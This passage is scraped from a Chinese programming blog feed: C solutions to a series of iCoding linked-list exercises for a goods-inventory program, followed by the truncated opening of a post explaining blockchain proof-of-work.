请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_list</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    *pL = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>    (*pL)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    GoodsList *Cur = *pL;<br>    GoodsInfo info;<br><br>    FILE *f;<br>    f = fopen(GOODS_FILE_NAME, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!f)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open file for reading&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(f, <span class="hljs-string">&quot;%s\t%s\t%d\t%s\t%d\t%d\n&quot;</span>,<br>                  info.goods_id,<br>                  info.goods_name,<br>                  &amp;info.goods_price,<br>                  info.goods_discount,<br>                  &amp;info.goods_amount,<br>                  &amp;info.goods_remain) != EOF)<br>    &#123;<br>        GoodsList *L = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>        L-&gt;data = info;<br>        L-&gt;next = Cur-&gt;next;<br>        Cur-&gt;next = L;<br>        Cur = Cur-&gt;next;<br>        CurrentCnt++;<br>    &#125;<br>    fclose(f);<br>    f = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：03-插入"><a href="#链表：03-插入" class="headerlink" title="链表：03-插入"></a>链表：03-插入</h3><blockquote><p>函数原型：bool insert_item(GoodsList *L, GoodsInfo goodsInfo, int choice)，</p><p>L为指向链表头结点的指针，函数根据choise的值，将goodsInfo插入到链表的指定位置，如果成功插入，函数返回true，如果未插入，函数返回false。</p><p>分别实现头插法、尾插法，中间位置插入三种:</p><ul><li>用户输入0，将商品信息插入到链表尾部；</li><li>用户输入1，将商品信息插入到链表头部；</li><li>用户输入其它正整数i，将商品信息插入到链表中间第i号位置, 例如：输入3，应该在第二个节点后插入新节点</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">insert_item</span><span class="hljs-params">(GoodsList *L, GoodsInfo item, <span class="hljs-type">int</span> choice)</span><br>&#123;<br>    GoodsList *pL = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>    pL-&gt;data = item;<br><br>    GoodsList *Cur = L;<br><br>    <span class="hljs-keyword">switch</span> (choice)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>    &#123;<br>        <span class="hljs-keyword">while</span> (Cur-&gt;next)<br>            Cur = Cur-&gt;next;<br>        pL-&gt;next = <span class="hljs-literal">NULL</span>;<br>        Cur-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        pL-&gt;next = L-&gt;next;<br>        L-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>    &#123;<br>        <span class="hljs-type">int</span> k = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k++ != choice)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!Cur-&gt;next || choice &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>            Cur = Cur-&gt;next;<br>        &#125;<br><br>        pL-&gt;next = Cur-&gt;next;<br>        Cur-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    &#125;<br>    CurrentCnt++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：04-删除节点"><a href="#链表：04-删除节点" class="headerlink" title="链表：04-删除节点"></a>链表：04-删除节点</h3><blockquote><p>函数原型：bool delete_item(GoodsList <em>L, char</em> goods_id)</p><p>其中L为指向链表头结点的指针，goods_id为要删除商品的ID；</p><p>如果成功删除，函数返回true，否则返回false。</p><p>delete_item 根据商品的ID来删除对应的商品信息，商品查找通过字符串比较的方式，查找到后释放对应指针指向的内存区域，完成删除。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">delete_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id)</span><br>&#123;<br>    GoodsList *Cur = L, *Del = Cur-&gt;next;<br>    <span class="hljs-keyword">while</span> (Del)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Del-&gt;data.goods_id, goods_id))<br>        &#123;<br>            Cur-&gt;next = Del-&gt;next;<br>            <span class="hljs-built_in">free</span>(Del);<br>            CurrentCnt--;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        Del = Del-&gt;next;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：05-查找"><a href="#链表：05-查找" class="headerlink" title="链表：05-查找"></a>链表：05-查找</h3><blockquote><p>函数原型：GoodsList* search_item(GoodsList <em>L, char</em> goods_id)</p><p>其中L为指向链表头结点的指针，goods_id为要查找商品的ID；</p><p>如果找到该商品，函数返回该商品对应的结点指针，否则返回 NULL.</p><p>根据输入的商品 ID 来查找对应的商品信息，商品 ID 的判断用字符串比较的方式来实现，然后调用格式化显示查找到的商品信息.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br>GoodsList *<span class="hljs-title function_">search_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id)</span><br>&#123;<br>    GoodsList *Cur = L;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Cur-&gt;data.goods_id, goods_id))<br>        &#123;<br>            <span class="hljs-keyword">return</span> Cur;<br>        &#125;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：06-修改"><a href="#链表：06-修改" class="headerlink" title="链表：06-修改"></a>链表：06-修改</h3><blockquote><p>函数原型：bool change_item(GoodsList <em>L, char</em> goods_id, GoodsInfo new_info)</p><p>其中 L 为指向链表头结点的指针，goods_id 为要修改的商品 ID，new_info 为该商品的最新数据。函数成功修改后返回true，否则返回 false。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id, GoodsInfo new_info)</span><br>&#123;<br>    GoodsList *Cur = L;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Cur-&gt;data.goods_id, goods_id))<br>        &#123;<br>            Cur-&gt;data = new_info;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：07-显示单个节点"><a href="#链表：07-显示单个节点" class="headerlink" title="链表：07-显示单个节点"></a>链表：07-显示单个节点</h3><blockquote><p>函数原型：void output_one_item(GoodsList *p)，函数显示结点为 p 的商品信息。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">output_one_item</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_id);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_price);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_discount);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_amount);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_remain);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：08-显示所有节点"><a href="#链表：08-显示所有节点" class="headerlink" title="链表：08-显示所有节点"></a>链表：08-显示所有节点</h3><blockquote><p>函数原型：void output_all_items(GoodsList *L)，</p><p>L为指针链表头结点的指针，output_all_items 调用 output_one_item 函数，将链表中所有的商品信息以格式化的方式打印输出到屏幕上。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">output_all_items</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    GoodsList *Cur = L-&gt;next;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        output_one_item(Cur);<br>        Cur = Cur-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：09-释放链表"><a href="#链表：09-释放链表" class="headerlink" title="链表：09-释放链表"></a>链表：09-释放链表</h3><blockquote><p>函数原型：void destory_list(GoodsList **L)，</p><p>该函数释放包括头结点在内的所有结点，完成后指向链表头结点的指针为NULL。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    GoodsList *Cur = *pL, *Des;<br>    <span class="hljs-keyword">while</span> (Cur-&gt;next)<br>    &#123;<br>        Des = Cur-&gt;next;<br>        Cur-&gt;next = Des-&gt;next;<br>        <span class="hljs-built_in">free</span>(Des);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(*pL);<br>    (*pL) = <span class="hljs-literal">NULL</span>;<br>    CurrentCnt = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：10-释放链表并删除文件"><a href="#链表：10-释放链表并删除文件" class="headerlink" title="链表：10-释放链表并删除文件"></a>链表：10-释放链表并删除文件</h3><blockquote><p>函数原型：void destory_list_and_file(GoodsList **L)，</p><p>该函数调用destory_list释放包括头结点在内的所有结点，将指向链表头结点的指针为NULL，最后删除存储商品信息的文件goodinfo.txt。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list_and_file</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    destory_list(pL);<br>    remove(<span class="hljs-string">&quot;goodsinfo.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：11-保存文件"><a href="#链表：11-保存文件" class="headerlink" title="链表：11-保存文件"></a>链表：11-保存文件</h3><blockquote><p>函数原型：int save_to_file(GoodsList *L)</p><p>将当前链表所有的商品信息保存到文件 goodsinfo.txt 中，其中L为指向链表头结点的指针，保存成功后，该函数返回商品的数量。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">save_to_file</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!L)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    GoodsList *Cur = L-&gt;next;<br>    FILE *f = fopen(<span class="hljs-string">&quot;goodsinfo.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>); <span class="hljs-comment">// iCoding貌似识别不了GOODS_FILE_NAME</span><br>    <span class="hljs-type">int</span> counts = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (!f)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br><br>        <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%s\t%s\t%d\t%s\t%d\t%d\n&quot;</span>,<br>                Cur-&gt;data.goods_id,<br>                Cur-&gt;data.goods_name,<br>                Cur-&gt;data.goods_price,<br>                Cur-&gt;data.goods_discount,<br>                Cur-&gt;data.goods_amount,<br>                Cur-&gt;data.goods_remain);<br><br>        Cur = Cur-&gt;next;<br>        counts++;<br>    &#125;<br><br>    fclose(f);<br>    f = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> counts;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：12-排序"><a href="#链表：12-排序" class="headerlink" title="链表：12-排序"></a>链表：12-排序</h3><blockquote><p>函数原型：void bubble_sort(GoodsList *L)</p><p>L为指向链表头结点的指针，该函数利用冒泡排序算法，按价格从低到高对商品进行排序。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    GoodsList *Cur = L-&gt;next;<br>    GoodsInfo temp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CurrentCnt - <span class="hljs-number">1</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; CurrentCnt - i; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (Cur-&gt;data.goods_price &gt; Cur-&gt;next-&gt;data.goods_price)<br>            &#123;<br>                temp = Cur-&gt;data;<br>                Cur-&gt;data = Cur-&gt;next-&gt;data;<br>                Cur-&gt;next-&gt;data = temp;<br>                <span class="hljs-comment">// output_all_items(L);</span><br>                <span class="hljs-comment">//  printf(&quot;\n&quot;);</span><br>            &#125;<br>            Cur = Cur-&gt;next;<br>        &#125;<br>        Cur = L-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：13-读商品信息"><a href="#链表：13-读商品信息" class="headerlink" title="链表：13-读商品信息"></a>链表：13-读商品信息</h3><blockquote><p>函数原型：GoodsInfo read_goods_info()</p><p>该函数调用read_line及scanf等函数，按“商品ID、商品名称、商品价格、商品折扣、商品数量、商品剩余数量”的顺序让用户输入，并将这些信息保存到 GoodsInfo 结构体中，函数最后返回该结构体。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br>GoodsInfo <span class="hljs-title function_">read_goods_info</span><span class="hljs-params">()</span><br>&#123;<br>    GoodsInfo goods;<br>    read_line(goods.goods_id, MAX_ID_LEN);<br>    read_line(goods.goods_name, MAX_NAME_LEN);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_price);<br>    read_line(goods.goods_discount, MAX_DISCOUNT_LEN);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_amount);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_remain);<br>    <span class="hljs-keyword">return</span> goods;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>iCoding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Block Chain -- Proof Of Work</title>
    <link href="/posts/32752/"/>
    <url>/posts/32752/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链共识机制-POW-工作量证明-Proof-Of-Work-学习"><a href="#区块链共识机制-POW-工作量证明-Proof-Of-Work-学习" class="headerlink" title="区块链共识机制 - POW 工作量证明 Proof Of Work 学习"></a>区块链共识机制 - POW 工作量证明 Proof Of Work 学习</h1><blockquote><p><strong>工作量证明PoW（Proof of Work）</strong>，通过算力的比拼来选取一个节点，由该节点决定下一轮共识的区块内容（记账权）。PoW要求节点消耗自身算力尝试不同的随机数（nonce），从而寻找符合算力难度要求的哈希值，不断重复尝试不同随机数直到找到符合要求为止，此过程称为“挖矿”。具体的流程如下图：</p><p><img src="https://pic4.zhimg.com/80/v2-ace420259e494348c6d6407f3e1a90c7_720w.webp" alt="img"></p><p>第一个找到合适的nonce的节点获得记账权。节点生成新区块后广播给其他节点，其他节点对此区块进行验证，若通过验证则接受该区块，完成本轮共识，否则拒绝该区块，继续寻找合适的nonce。</p><p>来自–<a href="https://zhuanlan.zhihu.com/p/367862889">一文读懂主流共识机制：PoW、PoS和DPoS - 知乎 (zhihu.com)</a></p></blockquote><p>这里通过<code>NodeJs</code>来实现–<a href="https://www.bilibili.com/video/BV14E411v7eS/?spm_id_from=333.788&vd_source=2c3bfa76e1e85787859b972cb7834a7c">程序员来讲讲什么是区块链 | 小白也能听懂的通俗解释 | 区块链原理 | 比特币 | 数字货币_哔哩哔哩_bilibili</a></p><h2 id="1、简易区块链搭建"><a href="#1、简易区块链搭建" class="headerlink" 